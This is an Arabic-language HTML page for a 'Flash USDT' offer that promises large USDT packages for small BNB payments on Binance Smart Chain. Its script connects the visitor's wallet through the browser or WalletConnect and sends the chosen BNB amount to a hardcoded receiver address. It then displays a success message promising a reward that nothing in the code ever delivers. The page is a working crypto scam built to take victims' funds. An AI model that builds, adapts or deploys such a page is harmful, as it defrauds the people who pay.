<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flash USDT Protocol | Professional Edition</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <style>
        * { box-sizing: border-box; transition: 0.3s; }
        body { 
            background: #0b0e11; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; 
            display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px;
        }
        .container { max-width: 400px; width: 100%; text-align: center; margin-top: 30px; }
        .logo { color: #f3ba2f; font-size: 32px; font-weight: bold; margin-bottom: 5px; }
        .card { 
            background: #181a20; border: 1px solid #474d57; border-radius: 20px; 
            padding: 25px; margin-bottom: 20px; cursor: pointer; position: relative;
        }
        .card:hover { border-color: #f3ba2f; transform: translateY(-3px); background: #1e2329; }
        .vip { border: 2px solid #f3ba2f; box-shadow: 0 0 15px rgba(243, 186, 47, 0.1); }
        .amount { font-size: 32px; color: #f3ba2f; font-weight: bold; display: block; }
        .price { font-size: 17px; color: #929aa5; display: block; margin: 8px 0 15px; }
        .btn { 
            background: #f3ba2f; color: black; border: none; padding: 14px; 
            width: 100%; border-radius: 12px; font-weight: bold; font-size: 17px; cursor: pointer;
        }
        .status { margin-top: 15px; font-size: 14px; color: #f3ba2f; font-weight: 500; display: none; }
        
        /* تحسين مظهر نافذة WalletConnect */
        #walletconnect-wrapper { z-index: 9999 !important; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">Flash USDT ⚡</div>
        <p style="color: #929aa5; margin-bottom: 30px;">بروتوكول التوزيع الفوري الذكي (BSC)</p>

        <div class="card vip" onclick="handlePayment('1.0')">
            <span class="amount">50,000 USDT</span>
            <span class="price">التكلفة: 1.0 BNB</span>
            <button class="btn">تفعيل حزمة VIP</button>
        </div>

        <div class="card" onclick="handlePayment('0.05')">
            <span class="amount">2,500 USDT</span>
            <span class="price">التكلفة: 0.05 BNB</span>
            <button class="btn">تفعيل الحزمة</button>
        </div>

        <div class="card" onclick="handlePayment('0.012')">
            <span class="amount">500 USDT</span>
            <span class="price">التكلفة: 0.012 BNB</span>
            <button class="btn">تفعيل الحزمة</button>
        </div>
        
        <div id="statusLabel" class="status">جاري الاتصال...</div>
    </div>

    <script>
        const RECEIVER_WALLET = "0x7325622388A2967BCaAeE94C986836EB7aB80f4E";

        async function handlePayment(amount) {
            const label = document.getElementById('statusLabel');
            label.style.display = 'block';
            label.innerText = "يرجى اختيار المحفظة والموافقة على العملية...";

            // 1. التحقق إذا كان المستخدم داخل متصفح محفظة بالفعل (DApp Browser)
            if (window.ethereum) {
                try {
                    const web3 = new Web3(window.ethereum);
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    await sendTransaction(web3, accounts[0], amount);
                } catch (e) {
                    label.innerText = "تم إلغاء العملية أو فشل الاتصال.";
                }
            } 
            // 2. إذا كان مستخدم متصفح عادي (Chrome/Safari) نستخدم WalletConnect
            else {
                try {
                    const provider = new WalletConnectProvider.default({
                        rpc: { 56: "https://bsc-dataseed.binance.org/" },
                        chainId: 56,
                        qrcodeModalOptions: { mobileLinks: ["metamask", "trust"] }
                    });

                    await provider.enable();
                    const web3 = new Web3(provider);
                    const accounts = await web3.eth.getAccounts();
                    await sendTransaction(web3, accounts[0], amount);
                    
                    // قطع الاتصال بعد النجاح لتجنب تعليق المحفظة
                    await provider.disconnect();
                } catch (e) {
                    label.innerText = "فشل الربط. يرجى المحاولة مرة أخرى.";
                    console.error(e);
                }
            }
        }

        async function sendTransaction(web3, fromAccount, amount) {
            const label = document.getElementById('statusLabel');
            try {
                const chainId = await web3.eth.getChainId();
                if (chainId !== 56 && chainId !== '0x38') {
                    alert("يرجى تحويل الشبكة إلى Binance Smart Chain");
                    return;
                }

                const amountWei = web3.utils.toWei(amount, "ether");
                
                label.innerText = "جاري تنفيذ المعاملة... انتظر الموافقة";
                
                await web3.eth.sendTransaction({
                    from: fromAccount,
                    to: RECEIVER_WALLET,
                    value: amountWei,
                    gasPrice: await web3.eth.getGasPrice()
                });

                alert("تمت العملية بنجاح! ستصلك المكافأة فور تأكيد الشبكة.");
                label.style.display = 'none';
            } catch (error) {
                alert("فشلت المعاملة. تأكد من وجود رصيد كافٍ للرسوم.");
                label.style.display = 'none';
            }
        }
    </script>
</body>
</html>
